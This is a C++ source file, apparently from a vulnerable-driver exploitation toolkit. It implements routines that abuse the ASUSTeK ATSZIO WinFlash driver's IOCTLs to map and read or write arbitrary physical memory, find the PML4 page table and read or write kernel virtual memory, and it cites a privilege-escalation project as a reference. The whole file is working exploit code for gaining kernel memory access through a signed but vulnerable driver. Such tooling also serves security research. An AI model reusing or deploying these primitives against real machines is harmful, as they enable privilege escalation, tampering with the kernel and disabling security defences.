/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       ATSZIO.CPP
*
*  VERSION:     1.13
*
*  DATE:        05 Feb 2022
*
*  ASUSTeK ATSZIO WinFlash driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/atszio.h"

//
// Based on ASUSTeK header and lib files
// https://github.com/DOGSHITD/SciDetectorApp/tree/master/DetectSciApp
//
// Another reference https://github.com/LimiQS/AsusDriversPrivEscala
//

/*
* AtszioMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID AtszioMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle
)
{
    ULONG_PTR offset;
    ULONG mapSize;
    ATSZIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));

    offset = PhysicalAddress & ~(PAGE_SIZE - 1);
    mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;

    request.Offset.QuadPart = offset;
    request.ViewSize = mapSize;

    if (supCallDriver(DeviceHandle,
        IOCTL_ATSZIO_MAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        return request.MappedBaseAddress;
    }

    return NULL;
}

/*
* AtszioUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID AtszioUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle
)
{
    ATSZIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.SectionHandle = SectionHandle;
    request.MappedBaseAddress = SectionToUnmap;

    supCallDriver(DeviceHandle,
        IOCTL_ATSZIO_UNMAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* AtszioQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI AtszioQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
    HANDLE sectionHandle = NULL;

    DWORD cbRead = 0x100000;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)AtszioMapMemory(DeviceHandle,
        0ULL,
        cbRead,
        &sectionHandle);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        AtszioUnmapMemory(DeviceHandle,
            (PVOID)pbLowStub1M,
            sectionHandle);

    }

    return (PML4 != 0);
}

/*
* AtszioReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI AtszioReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;
    ULONG_PTR offset;
    HANDLE sectionHandle = NULL;

    //
    // Map physical memory section.
    //
    mappedSection = AtszioMapMemory(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes,
        &sectionHandle);

    if (mappedSection) {

        offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));

        __try {

            if (DoWrite) {
                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        //
        // Unmap physical memory section.
        //
        AtszioUnmapMemory(DeviceHandle,
            mappedSection,
            sectionHandle);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* AtszioReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI AtszioReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return AtszioReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* AtszioWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI AtszioWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return AtszioReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* AtszioVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI AtszioVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        AtszioQueryPML4Value,
        AtszioReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* AtszioWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory via ATSZIO.
*
*/
BOOL WINAPI AtszioWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = AtszioVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = AtszioReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

/*
* AtszioReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory via ATSZIO.
*
*/
BOOL WINAPI AtszioReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = AtszioVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = AtszioReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}
